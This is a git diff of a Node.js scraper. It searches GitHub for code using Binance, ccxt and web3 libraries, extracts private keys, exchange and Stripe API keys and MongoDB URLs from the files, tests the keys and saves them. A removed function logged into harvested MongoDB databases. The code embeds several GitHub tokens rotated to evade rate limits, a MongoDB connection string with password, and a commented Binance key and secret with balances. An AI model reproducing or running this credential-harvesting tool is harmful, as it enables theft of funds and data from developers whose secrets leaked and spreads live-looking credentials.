@@ -39,8 +39,8 @@ Sentry.init({
 
 
 
-let jon = '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'
-let user32 = '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'
+let jon = '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'
+let user32 = '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'
 let eaglesfan = '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'
 
 
@@ -49,7 +49,7 @@ let eaglesfan = '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'
 
 
 
-let ghAccounts = [ eaglesfan, user32,  jon, ]
+let ghAccounts = [ user32,  jon, ]
 let ghAccount = ghAccounts[Math.floor(Math.random() * ghAccounts.length)]
 let parser
 
@@ -65,7 +65,7 @@ const initGithubAccounts = async () => {
     console.log(rateLimitData)
     //console.log(rateLimitData)
     if(rateLimitData.data.rate.remaining > 0) {
-      accounts.push(temp)
+      return accounts.push({ghAccount: temp, callsRemaining: rateLimitData.data.rate.remaining})
     }
     else {
 
@@ -81,7 +81,7 @@ const initGithubAccounts = async () => {
     else {
       console.log('using', accounts.length)
     }
-    return Promise.resolve(accounts)
+    return Promise.resolve(accounts.sort((a, b) => a.callsRemaining > b.callsRemaining))
   })
 }
 
@@ -98,7 +98,7 @@ const pickRandomUrl = urls => {
 }
 
 
-async function parseRepos(query,  ghAccount, page) {
+async function followRepos(query,  ghAccount, page) {
   let urlsQueried = []
   let reposAlreadyLookedAt = 0
   let percentageDone
@@ -262,15 +262,17 @@ async function parseForks(query) {
    
 
 
-
+//should be able to parse the files and commits at the same time
+// I offloaded both tasks to seperate worker threads.
 const handleRepo = async (repo, ghAccount) => {
-  console.log('repo info', repo)
+  console.log('repo added to queue', repo.name)
+  let work = []
   const data = await parser.collectData(repo.html_url)
   const commits = await makeOctokitRequest(ghAccount.rest.repos.listCommits({
     owner: repo.owner.login,
     repo: repo.name
   }), ghAccount)
-  console.log('got commits', commits.data.data)
+  
   
   const shouldIgnore = ['gitignore', 'scss', 'DS_STORE', 'log', 'firebaserc', 'Miscellaneous', 'state', 'gitkeep', 'prettierrc', 'babelrc', 'pub', 'priv', 'gif', 'dockerignore', 'example', 'yml', 'prettierignore', 'jpg', 'eslintrc', 'lock', 'cjs', 'woff', 'sss', 'woff2', 'ttf', 'ico', 'map', 'gitattributes', 'eot', 'css', 'mp4', 'svg', 'ui', 'png', 'md']
   let files = []
@@ -290,16 +292,14 @@ const handleRepo = async (repo, ghAccount) => {
    
       
     })
-  const commitParser = await spawn(new Worker('./workers/parseCommits'))
-  await commitParser(commits.data.data).then(async res => {
-    console.log('finished parsing commits', res)
-    await Thread.terminate(commitParser)
-  })
+  // const commitParser = await spawn(new Worker('./workers/parseCommits'))
+//  let commitPromiseChain =  await commitParser(commits.data.data).then(async res => {
+//     console.log('finished parsing commits', res)
+//     await Thread.terminate(commitParser)
+//   })
   files = files.filter(item => item.indexOf('node_modules') === -1).filter(item => item.indexOf('robots.txt') === -1)
-  let promises = []
   
   return Promise.each(files, async (file, index) => {
-    console.log('file name', file)
     return makeOctokitRequest(ghAccount.request(`GET ${file}`), ghAccount).then(async res => {
       if(typeof res.data.data === 'object') {
         console.log('skipping file')
@@ -310,362 +310,75 @@ const handleRepo = async (repo, ghAccount) => {
       })
       
       let fileParser = await spawn(new Worker('./workers/parseFile'))
-      await fileParser(file).then(async res => {
-        console.log('file done being parsed', res)
-        await Thread.terminate(fileParser)
-      })
+      let result = await fileParser(text)
+      // await Thread.terminate(fileParser)
+      return result
     })
       
   })
   
 }
-const fetchCode = async (query, page) => {
-  let reposAlreadyLookedAt = 0
-  
-  let urlsQueried = []
+const followCommits = async (query, gh, page) => {
+  return makeOctokitRequest(gh.rest.search.commits({q:query, page, per_page:100}), gh).then(async data => {
+    let commitParser = await spawn(new Worker('./workers/parseCommits'))
+    await commitParser(data.data.data.items).then(() => {
+      console.log('need more commits', query)
+      // return Thread.terminate(commitParser)
+    })
+  })
 
-  const code = await gh.rest.search.code({
+}
+
+// returns an array of codefiles in utf-8 format
+const collectFiles = async (query, ghAccount, page) => {
+  
+  const code = await makeOctokitRequest(ghAccount.rest.search.code({
     q: query,
     order: 'desc',
     sort: 'best-match',
     per_page: 100,
     page
-  }).catch(err => err)
-  let codeItems
-  try {
-    codeItems = code.data.items;
-    //console.log('working with', code.data.items.length)
-    
-    //console.log(code.data.items[0])
-  }
-  catch(err) {
-    console.log('error caught', err)
-    return Promise.resolve([])
-  }
- 
-  const uniqueRepos = new Set(codeItems.map(item => item.repository))
-  let uniqueRepoArray = Array.from(uniqueRepos)
- 
+  }), ghAccount).catch(err => err)
 
   //console.log(uniqueRepoArray.map(item => item))
-  return Promise.each(uniqueRepoArray, async (repo, index) => {
+  return Promise.map(code.data.data.items, async (item, index) => {
+    const content = await makeOctokitRequest(ghAccount.rest.git.getBlob({
+      owner: item.repository.owner.login,
+      repo: item.repository.name,
+      file_sha: item.sha
+    }), ghAccount)
     
-    const randomRepo = pickRandomUrl(uniqueRepoArray)
-    console.log('picked url', randomRepo.html_url)
-    if(urlsQueried.indexOf(randomRepo.html_url) !== -1) {
-      return Promise.resolve(null)
-    }
-    
-   return mongoose.model('repos').findOne({repo: {id: randomRepo.id}}).then(repo => {
-    // console.log('found repo in db', repo !== null)
-      if(repo === false) {
-        reposAlreadyLookedAt += 1
-        return Promise.resolve(repo)
-      }
-      else {
-        // console.log('repo is', repo)
-        reposAlreadyLookedAt +=1
-        let percentageDone = `percentageDone ${reposAlreadyLookedAt / uniqueRepoArray.length}, reposAlreadyLookedAt: ${reposAlreadyLookedAt}, totalRepos: ${uniqueRepoArray.length}, lookedAt: ${urlsQueried.length}, url: ${randomRepo.html_url} `;
+    const codeFile = Buffer.from(content.data.data.content, 'base64').toString('utf-8')
+    return Promise.resolve({content: codeFile, repository:item.repository})
+  })
+}
+
+
+
+
         
-        return handleRepo(randomRepo, percentageDone).then(() => {
-          urlsQueried.push(randomRepo.html_url)
-        }).catch(err => Sentry.captureException(err))
-      }
-    }).catch(err => Sentry.captureException(err))
-  }).catch(err => Sentry.captureException(err))
 
-}
-async function parseCode(query) {
-  console.log('running for query', query)
-  fetchCode(query,  Math.floor(Math.random() * (10 - 1 + 1) + 1) )
-  
-}
-
-const parseFile = async file => {
-  console.log('parsing file', file)
-  let mongoUrlExtractor = await spawn(new Worker('./workers/parseForMongodbUrls'))
-          
-  let privateKeyExtractor = await spawn(new Worker('./workers/parseForPrivateKeys'))
-  let binanceKeyExtractor = await spawn(new Worker('./workers/parseForBinanceKeys'))
-  let stripeKeyExtractor = await spawn(new Worker('./workers/parseForStripeKeys'))
-
-  let privateKeys = await privateKeyExtractor(file)
-  let binanceKeys = await binanceKeyExtractor(file)
-  let stripeKeys = await stripeKeyExtractor(file)
-  let mongoDatabases = await mongoUrlExtractor(file)
-  let keyTester = await spawn(new Worker('./workers/testKeys'))
-  let accounts = await keyTester(privateKeys)
-  
-  //let mongoUrls = await mongoUrlExtractor(dotEnvFile)
-  console.log('private keys', privateKeys)
-  console.log('binance keys', binanceKeys)
-  console.log('stripe keys', stripeKeys)
-  console.log('databases', mongoDatabases)
-  console.log('accounts', accounts)
-  if(mongoDatabases) {
-    console.log('saving mongo url')
-    let mongoUrlSaver = await spawn(new Worker('./workers/saveMongoUrls'))
-    let saveMongoUrls = await mongoUrlSaver(mongoDatabases)
-    await Thread.terminate(mongoUrlSaver).then(console.log)
-  }
-  if(stripeKeys.length > 0) {
-    let stripeKeySaver = await spawn(new Worker('./workers/saveStripeKeys'))
-    await stripeKeySaver(stripeKeys).then(() => {
-      return Thread.terminate(stripeKeySaver)
-    })
-  }
-
-  if(binanceKeys.length > 0) {
-    let binanceKeySaver = await spawn(new Worker('./workers/saveBinanceKeys'))
-    await binanceKeySaver(binanceKeys).then(() => {
-      return Thread.terminate(binanceKeySaver).then(console.log)
-    })
-  }
-
-  await (Thread.terminate(privateKeyExtractor)).then(console.log)
-  await (Thread.terminate(binanceKeyExtractor)).then(console.log)
-  await (Thread.terminate(stripeKeyExtractor)).then(console.log)
-  await (Thread.terminate(mongoUrlExtractor)).then(console.log)
-  await (Thread.terminate(keyTester)).then(console.log)
-  return Promise.resolve(file)
-}
-
-        // console.log('first', res.data.data.files[0])
-  //       return Promise.each(res.data.data.files, async (file, index) => {
-  //         // return makeOctokitRequest(gh.request(`GET ${file.raw_url}`, {
-  //         //   owner: commit.repository.owner.login,
-  //         //   repo: commit.repository.name,
-  //         //   file_sha: file.sha
-  //         // }), gh).then(res => res)
-  //         return makeOctokitRequest(gh.rest.git.getBlob({
-  //           owner: commit.repository.owner.login,
-  //           repo: commit.repository.name,
-  //           file_sha: file.sha
-  //         }), gh).then(async res => {
-  //           const content = res.data.data.content
-            
-  //           let file = Buffer.from(content, 'base64').toString('utf-8')
-  //           console.log(file)
-            
-  //           //let mongoDatabaseExtractor = await spawn(new Worker('./workers/parseForMongodbUrls'))
-  //           // console.log(mongoDatabaseExtractor)
-           
-  //           let privateKeyExtractor = await spawn(new Worker('./workers/parseForPrivateKeys'))
-  //           let binanceKeyExtractor = await spawn(new Worker('./workers/parseForBinanceKeys'))
-  //           let privateKeys = await privateKeyExtractor(file)
-  //           let binanceKeys = await binanceKeyExtractor(file)
-            
-  //           let keyTester = await spawn(new Worker('./workers/testKeys'))
-  //           let accounts = await keyTester(privateKeys)
-  //           console.log(accounts)
-            
-  //           //const mongooseUrl = await mongoDatabaseExtractor(file)
-  //           console.log('private keys', privateKeys)
-  //           console.log('binance keys', binanceKeys)
-  //           //console.log('mongodb urls', mongooseUrl)
-  //           //if(mongooseUrl) {
-  //             //console.log('saving mongo url')
-  //             //let mongoUrlSaver = await spawn(new Worker('./workers/saveMongoUrls'))
-  //             //let saveMongoUrls = await mongoUrlSaver(mongooseUrl)
-  //           //}
-  //           // let promises = []
-  //           // promises.push(parseForBinanceKeys(c))
-  //           // promises.push(parseForCoinbaseKeys(c))
-  //           // promises.push(parseForPrivateKeys(c))
-  //           // return Promise.all(promises).catch(err => {
-  //           //   Sentry.captureException(err)
-  //           // })
-  //         })
-  //       }).catch(err => Sentry.captureException(err))
-  //     }
-  //   }).catch(err => Sentry.captureException(err))
-      
-  // }).catch(err => Sentry.captureException(err))
-
-
-
-// async function parseCommits(query, gh) {
-//   const q = query
-//   const page = Math.floor(Math.random() * (10 - 1 + 1) + 1)
-//   console.log('running for commits. Query is:', q)
-//   console.log('page is:', page)
-
-//   const commits = await makeOctokitRequest(gh.rest.search.commits({
-//     q,
-//     order: 'asc',
-//     per_page: 100,
-//     page
-//   }), gh)
-//   const {data, cost} = commits
-//   console.log(data, cost)
-//   const commitItems = data.data.items;
-//   console.log('length', commitItems.length)
-  
-//   //console.log('got commit', commit)
-//   return Promise.each(commitItems, async (commit, index) => {
-//     return makeOctokitRequest(gh.request(`GET ${commit.url}`), gh).then(res => {
-
-//       const dotEnv = res.data.data.files.find(file => file.filename === '.env')
-//       const configs = res.data.data.files.filter(file => file.filename.includes('config') || file.filename.includes('settings'))
-//       if(configs.length > 0) {
-//         console.log('configs found for commit', commit)
-//       }
-//       if(dotEnv) {
-//         return makeOctokitRequest(gh.rest.git.getBlob({
-//           owner: commit.repository.owner.login,
-//           repo: commit.repository.name,
-//           file_sha: dotEnv.sha
-//         }), gh).then(async res => {
-//           const {data, cost} = res
-//           console.log('blob cost', cost)
-//           const content = data.data.content
-//           let file = Buffer.from(content, 'base64').toString('utf-8')
-//           console.log(dotEnvFile)
-//           //let mongoUrlExtractor = await spawn(new Worker('./workers/parseForMongodbUrls'))
-          
-//           let privateKeyExtractor = await spawn(new Worker('./workers/parseForPrivateKeys'))
-//           let binanceKeyExtractor = await spawn(new Worker('./workers/parseForBinanceKeys'))
-//           let privateKeys = await privateKeyExtractor(dotEnvFile)
-//           let binanceKeys = await binanceKeyExtractor(dotEnvFile)
-//           //let mongoUrls = await mongoUrlExtractor(dotEnvFile)
-//           console.log('private keys', privateKeys)
-//           console.log('binance keys', binanceKeys)
-//           //console.log('mongo urls', mongoUrls)
-//           //if(mongoUrls) {
-//             //console.log('saving mongo url')
-//             //let mongoUrlSaver = await spawn(new Worker('./workers/saveMongoUrls'))
-//             //let saveMongoUrls = await mongoUrlSaver(mongoUrls)
-//           //}
-//          // let mongoDatabaseExtractor = await spawn(new Worker('./workers/parseForMongodbUrls'))
-//           // let mongoUrl = parseForMongoDatabaseUrls(c)
-//           // console.log('got mongourl', mongoUrl)
-//           // let promises = []
-//           // promises.push(parseForBinanceKeys(c))
-//           // promises.push(parseForCoinbaseKeys(c))
-//           // promises.push(parseForPrivateKeys(c))
-    
-//         })
-//       }
-//       else {
-//         console.log('else running')
-//         return Promise.each(res.data.files, async (file, index) => {
-//           return makeOctokitRequest(gh.rest.git.getBlob({
-//             owner: commit.repository.owner.login,
-//             repo: commit.repository.name,
-//             file_sha: file.sha
-//           }), gh).then(async res => {
-//             const content = res.data.data.content
-//             let dotEnvFile = Buffer.from(content).toString('utf-8')
-            
-//             //let mongoDatabaseExtractor = await spawn(new Worker('./workers/parseForMongodbUrls'))
-//             // console.log(mongoDatabaseExtractor)
-           
-//             let privateKeyExtractor = await spawn(new Worker('./workers/parseForPrivateKeys'))
-//             let binanceKeyExtractor = await spawn(new Worker('./workers/parseForBinanceKeys'))
-//             let privateKeys = await privateKeyExtractor(dotEnvFile)
-//             let binanceKeys = await binanceKeyExtractor(dotEnvFile)
-            
-//             let keyTester = await spawn(new Worker('./workers/testKeys'))
-//             let accounts = await keyTester(privateKeys)
-//             console.log(accounts)
-            
-//             //const mongooseUrl = await mongoDatabaseExtractor(dotEnvFile)
-//             console.log('private keys', privateKeys)
-//             console.log('binance keys', binanceKeys)
-//             //console.log('mongodb urls', mongooseUrl)
-//             //if(mongooseUrl) {
-//               //console.log('saving mongo url')
-//               //let mongoUrlSaver = await spawn(new Worker('./workers/saveMongoUrls'))
-//               //let saveMongoUrls = await mongoUrlSaver(mongooseUrl)
-//             //}
-//             // let promises = []
-//             // promises.push(parseForBinanceKeys(c))
-//             // promises.push(parseForCoinbaseKeys(c))
-//             // promises.push(parseForPrivateKeys(c))
-//             // return Promise.all(promises).catch(err => {
-//             //   Sentry.captureException(err)
-//             // })
-//           })
-//         }).catch(err => Sentry.captureException(err))
-//       }
-//     }).catch(err => Sentry.captureException(err))
-      
-//   }).catch(err => Sentry.captureException(err))
-// }
 
 const runAction = (actionType, query, ghAccount, page) => {
   switch(actionType) {
     case 'parseCode':
-      return parseCode(query).catch(console.log)
+      return parseCode(query, ghAccount, page).catch(console.log)
     case 'parseForks':
       return parseForks(query)
-    case 'parseRepos':
-      return parseRepos(query, ghAccount, page)
-    case 'parseCommits':
-      return parseCommits(query, ghAccount, page)
+    case 'followRepos':
+      return followRepos(query, ghAccount, page)
+    case 'followCommits':
+      return followCommits(query, ghAccount, page)
     default:
-      parseRepos(query)
+      followRepos(query)
   }
 }
 
-const startConsuming = async () => {
-  console.log('consuming')
-  let urlFetcher = await spawn(new Worker('./workers/collectDatabaseUrls'))
-  let urls = await urlFetcher()
-  let url =
-  Promise.all(Promise.map(urls, async url => {
-      const tmpDb = await new mongoose.Mongoose()
-      const connection = await tmpDb.connect(url)
-      if(connection) {
-        const collectionNames = await (await tmpDb.connection.db.listCollections().toArray()).map(item => item.name)
-        const modelNames = collectionNames.map(name => name.charAt(0).toUpperCase() + name.slice(1))
-        let schema = new mongoose.Schema({}, {strict: false})
-        // console.log('got schema', schema)
 
-        const models = modelNames.map(name => {
-          return collectionNames.map(collectionName => {
-            console.log('collection name', collectionName)
-            // console.log('collection name', collectionName)
-            // console.log('model name', name)
-            return tmpDb.model(name, schema, collectionName)
-          })
-        }).reduce((a, b) => [...a, ...b])
-       
-      //  Promise.map(models, async model => {
-      //   console.log(await model.find())
-      //  })
-        
-      }
-      
-      
-      //let 
-      //console.log(tmpDb.model(collectionName.charAt(0).toUpperCase() + collectionName.slice(1)))
-    }))
-   
-   
-   //console.log(await connection.modelNames())
-    //console.log(Object.keys(connection))
-    // const collections = await await connection.db.listCollections().toArray().map(item => item.name)
+const runNormal = async () => {
   
-    // let tmpDb = await new mongoose.Mongoose()
-    // let connection = await tmpDb.connect(url)
-    // if(connection) {
-    //   // console.log('connection established for url', url)
-    //   let collectionNames = await (await tmpDb.connection.db.listCollections().toArray()).map(item => item.name)
-    //   // console.log(collectionNames)
-    //   console.log(collectionNames[0])
-    //   let Schema = new mongoose.Schema({}, {strict: false})
-    //  let collection = await tmpDb.connection.db.collection(collectionNames[0], Schema).find()
-    //  console.log(await collection[`_${collectionNames[0]}`].get())
-      // tmpDb.connection.db.collection(collectionNames[0], (err, collection) => {
-      //   console.log(err)
-      //   console.log(collection)
-      // })
-      // console.log(tmpDb.connection.db)
-      
-}
-const startInitial = async () => {
-  console.log('running initial')
+  console.log('running normally')
+  const work = []
   initGithubAccounts().then(async accounts => {
     console.log('got accounts', accounts.length)
     let ghAccount = accounts[Math.floor(Math.random() * accounts.length)]
@@ -675,134 +388,116 @@ const startInitial = async () => {
     var random = Math.floor(Math.random() * topicCount)
     const query = 'delete .env'
     console.log('topics', topicCount)
-    let queryForRepo 
-    // mongoose.model('repos').findOne({ topics: { $exists: true, $not: {$size: 0} } }).skip(random).then(res => {
-    //   const {topics} = res;
-    //   let queryForRepo
-    //   if(topics.length > 0) {
-    //     queryForRepo = topics[Math.floor(Math.random() * topics.length)]
-
-    //   }
-    //   else {
-    //     queryForRepo = 'ccxt.binance'
-    //   }
-    //     // console.log('topics length', topics.length)
-        
-       
-    //   }).catch(err => {
-    //     queryForRepo = 'ccxt.binance'
-    //     Sentry.captureException(err)
-    //   })
-      runAction('parseRepos', 'binance bot', ghAccount, page)
-     // runAction('parseCommits', query, ghAccount, page)
-      
-    }).catch(err => {
-
-      Sentry.captureException(err)
-    })
+    let queryForRepo = 'web3'
+    work.push(runAction('parseCode', "require('node-binance-api')", ghAccount, page))
+    work.push(runAction('parseCode', 'import binance:', ghAccount, page))
+    work.push(runAction('parseCode', 'from binance import Client:', ghAccount, page))
+    work.push(runAction('parseCode', 'ccxt.binance({apiKey:})', ghAccount, page))
+   // work.push(runAction('followRepos', queryForRepo, ghAccount, page))
+    //work.push(runAction('followCommits', query, ghAccount, page))
+    return Promise.all(work)
+   
+  })
    
 }
-const startParsing =  async () => {
-  process.on('uncaughtException', (err) => Sentry.captureException(err))
-  process.on('unhandledRejection', (err) => {
-    console.log(err)
-    Sentry.captureException(err)
-  })
+
+const privKeyScannerEther = async () => {
+  const ghAccount = await await initGithubAccounts()
+  const gh = ghAccount[0]
+  const libraries = ['web3', 'ether', 'web3-core-helpers', ]
+  const paths = ['./priv.json', './keys.json', './config.json', './config/configKey.json', '.env', './private.json', './privateKey.json']
   
-  mongoose.connect('mongodb+srv://jkol36:TheSavage1990@cluster0.bvjyjf3.mongodb.net/?retryWrites=true&w=majority').then(() => {
-    console.log('connected to db')
-    //return runAction('parseCommits')
-    //const prefixes = initApiKeyPrefixes().reduce((a, b) => [...a, ...b])
-    // const min = 0
-    // const max = 1000
-    // const randNum = Math.floor(Math.random() * (max - min))
-    // console.log('random number', randNum)
-    
-        // console.log('running action parse repos with', query)
-    setInterval(() => {
-      console.log('starting to parse commits')
-      initGithubAccounts().then(async accounts => {
-        console.log('got accounts', accounts.length)
-        let ghAccount = accounts[Math.floor(Math.random() * accounts.length)]
-        parser = new GitHubRepoParser(ghAccount)
-        let page = Math.floor(Math.random() * 10 - 1)
-        const topicCount = await mongoose.model('repos').countDocuments({ topics: { $exists: true, $not: {$size: 0} } })
-        var random = Math.floor(Math.random() * topicCount)
-        const query = 'delete .env'
-        console.log('topics', topicCount)
-        let queryForRepo 
-        mongoose.model('repos').findOne({ topics: { $exists: true, $not: {$size: 0} } }).skip(random).then(res => {
-          const {topics} = res;
-          let queryForRepo
-          if(topics.length > 0) {
-            queryForRepo = topics[Math.floor(Math.random() * topics.length)]
-
+  Promise.each(libraries, async library => {
+    let files = await fetchCode(`require(${library})`, gh, 2)
+    Promise.each(files, async file => {
+      let {repository} = file
+      const {owner:{login}, name} = repository
+      const work = Promise.map(paths, path => {
+        return makeOctokitRequest(gh.repos.getContent({
+          owner: login,
+          name,
+          path
+        }), gh).then(res => {
+          if(res) {
+            console.log('found res', res)
           }
-          else {
-            queryForRepo = 'ccxt.binance'
-          }
-            // console.log('topics length', topics.length)
-            
-           
-          }).catch(err => {
-            queryForRepo = 'ccxt.binance'
-            Sentry.captureException(err)
-          })
-          runAction('parseRepos', queryForRepo, ghAccount, page)
-          runAction('parseCommits', query, ghAccount, page)
-          
-        }).catch(err => {
-
-          Sentry.captureException(err)
         })
-
-        
-        
-      }, 600000)// 10 minutes
-    startInitial()
-    
+      })
+      return Promise.all(work)
+      
+    })
   })
+ 
+
+  // const work = Promise.map(libraries, async library => {
+  //   return runAction('parseCode', `require(${library})`, ghAccount, page)
+  // })
 }
 
+//returns the account with the mode api calls available
+
+const save = () => {
+  console.log()
+}
+const lookForBinanceKeys = async () => {
+  console.log('Looking for binance Keys')
+  const work = []
+  const queries = ["from binance import Client"]
+  const page = 1
+  initGithubAccounts()
+  .then(accounts => accounts[1])
+  .then(account => {
+    return Promise.each(queries, async query =>{
+      return collectFiles(query, account.ghAccount, 1).then(async res => {
+        return Promise.each(res, async file => {
+          let fileParser = await spawn(new Worker('./workers/parseFile'))
+          let result = await fileParser(file.content)
+          console.log(result)
+          return result
+        })
+      
+      })
+    })
+  })
+ 
+  // initGithubAccounts().then(async accounts => {
+  //   let ghAccount = accounts[Math.floor(Math.random() * accounts.length)]
+  //   parser = new GitHubRepoParser(ghAccount)
+  //   let page = Math.floor(Math.random() * (10 - 1 + 1) + 1)
+  //   //
+  //   //work.push(runAction('followRepos', queryForRepo, ghAccount, page))
+  //  // work.push(runAction('followCommits', query, ghAccount, page))
+  //   return Promise.all(work)
    
-    
-      
-    // mongoose.model('binanceAccounts').create({
-      
-    //     token: 'zyN3R5T1FOPwKLBvxnf09X6EkKzcIEBCes1RpNqD6moXU7YoqOBX3M2vFcUgCAQy',        
-    //     secret: 'dQMgSnNJs3MrBvU5qx65WYmn7PIAK9o0LLjLLVmPicjjCsWTA3iFA6H9UwDKn55h',       
-    //     cryptos: [
-    //       { crypto: 'BTC', balance: 0.00754945 },
-    //       { crypto: 'USDT', balance: 75.82065341 },
-    //       { crypto: 'MATIC', balance: 35.8641 },
-    //       { crypto: 'BUSD', balance: 113.1459823 },
-    //       { crypto: 'SAND', balance: 9.98071452 },
-    //       { crypto: 'LUNA', balance: 0.13644845 },
-    //       { crypto: 'LUNC', balance: 0.00253 }
-    //     ],
-       
-      
-    // }).then(doc => {
-    //   console.log('got doc', doc)
-    //   return doc.save()
-    // }).then(console.log)
-    // mongoose.model('binanceAccounts').find().then(doc => {
-    //   console.log('got doc', doc)
-      
-    // })
-    //  for(let i=0; i< 5; i++) {
-    //   let action = actionTypes[Math.floor(Math.random() * actionTypes.length)]
-     
-    //   runAction(action)
-    //  }
-    
-   
+  // })
+}
 const removeRepos = () => {
   return mongoose.connect('mongodb+srv://jkol36:TheSavage1990@cluster0.bvjyjf3.mongodb.net/?retryWrites=true&w=majority').then(() => {
   mongoose.model('repos').remove().then(console.log)
 })
 }
 
-startParsing()
+const start =  async () => {
+  
+  process.on('uncaughtException', (err) => Sentry.captureException(err))
+  process.on('unhandledRejection', (err) => {
+    console.log(err)
+    Sentry.captureException(err)
+  })
+  mongoose.connect('mongodb+srv://jkol36:TheSavage1990@cluster0.bvjyjf3.mongodb.net/?retryWrites=true&w=majority').then(() => {
+    console.log('connected to db')
+    setInterval(() => lookForBinanceKeys(), 600000)// 10 minutes
+    startInitial()
+  })
+}
 
+  
+// const query = 'from binance import Client'
+// initGithubAccounts().then(accounts => {
+
+//   const ghAccount = accounts[0].ghAccount
+//   collectFiles(query, ghAccount, 1).then(console.log)
+// })
+
+lookForBinanceKeys()
 //startConsuming()
